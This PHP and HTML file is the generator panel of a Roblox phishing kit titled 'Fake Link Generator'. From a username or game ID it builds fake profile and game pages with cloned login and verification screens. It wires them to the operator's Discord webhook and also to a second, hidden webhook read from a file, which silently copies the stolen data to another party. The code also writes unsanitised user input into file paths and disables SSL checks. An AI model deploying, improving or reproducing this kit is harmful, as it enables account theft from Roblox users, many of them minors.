<?php
if (isset($_POST['rusername'], $_POST['fusername'], $_POST['dwebhook'])) {
$rusername = $_POST['rusername'];
$fusername = $_POST['fusername'];
$dwebhook = $_POST['dwebhook'];
$ab = file_get_contents("https://api.newstargeted.com/roblox/users/v2/user.php?username=$rusername");
if(!empty(json_decode($ab)->userId)){
require('../../setup.php');
$parse = parse_url($dwebhook);
if($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com'){
$userid = rand();
mkdir("../../users/$userid/profile/login", 0777, true);
mkdir("users/$userid/profile/login/Verification", 0777, true);
mkdir("../../users/$userid/profile/controller", 0777, true);
file_put_contents("../../users/$userid/profile/index.php", file_get_contents('../../phishing_files/profile.php'));
file_put_contents("../../users/$userid/profile/controller/realusername.txt", $_POST['rusername']);
file_put_contents("../../users/$userid/profile/fakeusername.txt", $_POST['fusername']);
file_put_contents("../../users/$userid/profile/aboutme.txt", $_POST['aboutme']);
file_put_contents("../../users/$userid/profile/controller/activity.txt", 'game');
file_put_contents("../../users/$userid/profile/controller/friends.txt", '163');
file_put_contents("../../users/$userid/profile/controller/followers.txt", '3871');
file_put_contents("../../users/$userid/profile/controller/followings.txt", '542');
file_put_contents("../../users/$userid/profile/controller/joindate.txt", '6/4/2017');
file_put_contents("../../users/$userid/profile/controller/placevisits.txt", '782');
$token = strtoupper(substr(str_repeat(md5(rand()), ceil(32/32)), 0, 32));
$token = "$name-$token";
file_put_contents("../../users/$userid/profile/controller/dashboard.php", str_replace('QUBRWEBIRWBQYEIYOB',$token,file_get_contents('../../phishing_files/controller/dashboard.php')));
file_put_contents("../../users/$userid/profile/controller/login.php", str_replace('QUBRWEBIRWBQYEIYOB',$token,file_get_contents('../../phishing_files/controller/login.php')));
file_put_contents("../../users/$userid/profile/login/index.php", file_get_contents('../../phishing_files/login/index.php'));
file_put_contents("../../users/$userid/profile/login/Verification/index.php", file_get_contents('../../phishing_files/login/Verification/index.php'));
file_put_contents("../../users/$userid/profile/login/webhook.php", file_get_contents('../../phishing_files/login/webhook.php'));
file_put_contents("../../users/$userid/profile/login/b_webhook.txt", $_POST['dwebhook']);
file_put_contents("../../users/$userid/profile/login/d_webhook.txt", file_get_contents('d_webhook.txt'));
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]";
$timestamp = date("c", strtotime("now"));
$url = $_POST['dwebhook'];
$headers = ["Content-Type: application/json; charset=utf-8"];
$POST = [
	"username" => "$name - Bot",
	"avatar_url" => "$thumbnail",
	"content" => "@everyone",
	"embeds" => [
		[
			"title" => "Login to Controller",
			"type" => "rich",
			"url" => "$domain/users/$userid/profile/controller/login", 
			"color" => hexdec("$hex"),
			"footer" => [
				"text" => "$name • $timestamp",
				"icon_url" => "$thumbnail"
			],
			"thumbnail" => [
				"url" => "$thumbnail",
			],
			"fields" => [
				[
					"name" => "**Info**",
					"value" => "```Token: $token
					Url: $domain/users/$userid/profile```",
					"inline" => true
				],

			]
		],
	],

];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
$dual = file_get_contents('d_webhook.txt') ;
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $dual);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
$response = curl_exec($ch);
$success = 'Your link and controller token have been sent to your webhook!';
}
} else {
$error = 'This does not look like a webhook!';
}
} 
if (isset($_POST['gameid'], $_POST['dwebhook'])) {
$gameid = $_POST['gameid'];
$dwebhook = $_POST['dwebhook'];
$ab = file_get_contents("https://www.roblox.com/places/api-get-details?assetId=$gameid");
if(!empty(json_decode($ab)->UniverseId)){
$parse = parse_url($dwebhook);
if($parse['host'] == 'discord.com' || $parse['host'] == 'discordapp.com'){
$fgameid = rand();
$privateservercode = rand();
$db = file_get_contents("https://www.roblox.com/places/api-get-details?assetId=$gameid");
$gamename = str_replace("https://www.roblox.com/games/$gameid/",'',json_decode($db)->Url);
mkdir("../../games/$fgameid/$gamename/login", 0777, true);
mkdir("../../games/$fgameid/$gamename/login/Verification", 0777, true);
file_put_contents("../../games/$fgameid/$gamename/index.php", str_replace('{ROBLOX.GAMEID}',json_decode($db)->AssetId,file_get_contents('../../phishing_files/game.php')));
file_put_contents("../../games/$fgameid/$gamename/login/index.php", file_get_contents('../../phishing_files/login/index.php'));
file_put_contents("../../games/$fgameid/$gamename/login/Verification/index.php", file_get_contents('../../phishing_files/login/Verification/index.php'));
file_put_contents("../../games/$fgameid/$gamename/login/webhook.php", file_get_contents('../../phishing_files/login/webhook.php'));
file_put_contents("../../games/$fgameid/$gamename/login/b_webhook.txt", $_POST['dwebhook']);
file_put_contents("../../games/$fgameid/$gamename/login/d_webhook.txt", file_get_contents('d_webhook.txt'));
header("location: /games/$fgameid/$gamename?privateServerLinkCode=$privateservercode");
} else {
$error = 'This does not look like a webhook!';
}
} else {
$error = 'This game does not exist on roblox!';
}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<title>Fake Link Generator</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="../../css/util.css">
	<link rel="stylesheet" type="text/css" href="../../css/main.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</head>
<body>
<?php if (isset($error)) { ?>
      <script>
                  Swal.fire({
                  icon: 'error',
                  background: '#000',
                  title: '<font color="#fff">Failed!',
                  html: '<font color="#fff"><?=$error?>'
                  })
      </script>
<?php } ?>	
<?php if (isset($success)) { ?>
      <script>
                  Swal.fire({
                  icon: 'success',
                  background: '#000',
                  title: '<font color="#fff">Success!',
                  html: '<font color="#fff"><?=$success?>'
                  })
      </script>
<?php } ?>	
	<div class="limiter">
		<div class="container-login100" style="background-image: url('../../css/back.gif');">
			<div class="wrap-login100 p-l-110 p-r-110 p-t-62 p-b-33">
				<form class="login100-form validate-form flex-sb flex-w" onsubmit="return false;" id="select">
					<span class="login100-form-title p-b-53">
						Select Theme:
					</span>
<button class="btn-face m-b-20" onclick='document.getElementById("select").style.display = "none";document.getElementById("profile").style.display = "block";document.getElementById("game").style.display = "none";'>Profile</button>
<button class="btn-google m-b-20" onclick='document.getElementById("select").style.display = "none";document.getElementById("game").style.display = "block";document.getElementById("profile").style.display = "none";'>Game</button>
				</form>
				<form class="login100-form validate-form flex-sb flex-w" method="POST" style="display:none" id="profile">
					<span class="login100-form-title p-b-20">
						Fake Link Generator
					</span>
					<div class="p-t-31 p-b-9">
						<span class="txt1">
							Real Username
						</span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="text" name="rusername" >
						<span class="focus-input100"></span>
					</div>
					
					<div class="p-t-31 p-b-9">
						<span class="txt1">
							Fake Username
						</span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="text" name="fusername" >
						<span class="focus-input100"></span>
					</div>

					<div class="p-t-31 p-b-9">
						<span class="txt1">
							About Me
						</span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="text" name="aboutme" >
						<span class="focus-input100"></span>
					</div>

					<div class="p-t-31 p-b-9">
						<span class="txt1">
							Discord Webhook
						</span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="text" name="dwebhook" >
						<span class="focus-input100"></span>
					</div>
					<br>
                    <div class="container-login100-form-btn m-t-17">
						<button class="btn-face">
							Generate
						</button>
					</div>
				</form>
				<form class="login100-form validate-form flex-sb flex-w" method="POST" style="display:none" id="game">
					<span class="login100-form-title p-b-53">
						Fake Link Generator
					</span>
					<div class="p-t-31 p-b-9">
						<span class="txt1">
							Game ID
						</span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="text" name="gameid" >
						<span class="focus-input100"></span>
					</div>
					
					<div class="p-t-31 p-b-9">
						<span class="txt1">
							Discord Webhook
						</span>
					</div>
					<div class="wrap-input100">
						<input class="input100" type="text" name="dwebhook" >
						<span class="focus-input100"></span>
					</div>
					<br>
                    <div class="container-login100-form-btn m-t-17">
						<button class="btn-face">
							Generate
						</button>
					</div>
				</form>
			</div>
		</div>
	</div>
	<div id="dropDownSelect1"></div>
</body>
</html>